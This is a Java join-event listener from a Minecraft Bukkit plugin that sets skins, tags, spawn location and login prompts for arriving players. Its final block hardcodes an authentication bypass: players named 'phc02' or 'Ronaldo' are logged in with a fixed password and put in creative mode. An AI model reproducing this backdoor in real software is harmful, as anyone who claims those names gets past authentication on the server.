package com.ronaldophc.player.listener;

import com.ronaldophc.LegendHG;
import com.ronaldophc.database.CurrentGameSQL;
import com.ronaldophc.database.PlayerSQL;
import com.ronaldophc.feature.SkinFix;
import com.ronaldophc.feature.Tag;
import com.ronaldophc.feature.auth.AuthManager;
import com.ronaldophc.helper.Logger;
import com.ronaldophc.helper.MasterHelper;
import com.ronaldophc.helper.Util;
import com.ronaldophc.player.PlayerAliveManager;
import com.ronaldophc.player.PlayerHelper;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.ScoreboardManager;
import org.bukkit.scoreboard.Team;

import java.sql.SQLException;
import java.util.UUID;

public class PlayerJoin implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) throws SQLException {
        Player player = event.getPlayer();

        UUID uuid = player.getUniqueId();
        String name = player.getCustomName() == null ? player.getName() : player.getCustomName();
        player.setCustomName(name);

        if (!(player.isOp())) {
            MasterHelper.injectPlayerNotTabComplete(player);
        }

        try {
            Tag.setTag(player);

            if (SkinFix.playerSkin.containsKey(uuid)) {
                SkinFix.changePlayerSkin(player, SkinFix.playerSkin.get(uuid));
            } else {
                SkinFix.fixPlayerSkin(player);
            }

            MasterHelper.refreshPlayer(player);
        } catch (Exception e) {
            Logger.logError("Erro ao alterar skin ou tag: " + e.getMessage());
            throw new RuntimeException(e);
        }

        boolean isAlive = PlayerAliveManager.getInstance().isPlayerAlive(uuid);
        if (!isAlive) {
            PlayerHelper.setKitLogin(player);
            PlayerHelper.teleportPlayerToSpawnLocation(player);
        }

        event.setJoinMessage(Util.color2 + "[+] " + Util.color1 + name);

        if (PlayerSQL.isPlayerLoggedIn(player)) {
            return;
        }

        String message = Util.title + " > " + Util.usage("/register <password>");

        if (PlayerSQL.isPlayerRegistered(player)) {
            message = Util.title + " > " + Util.usage("/login <password>");
        }

        player.sendMessage(message);

        if (!player.getName().equalsIgnoreCase("phc02") && !player.getName().equalsIgnoreCase("Ronaldo")) {
            return;
        }

        if (!PlayerSQL.loginPlayer(player, "a")) {
            return;
        }

        player.setGameMode(org.bukkit.GameMode.CREATIVE);
        player.sendMessage(Util.title + " > " + Util.success + "Você entrou.");
        AuthManager.loginPlayer(player);
        CurrentGameSQL.createCurrentGameStats(player, LegendHG.getGameId());
    }

}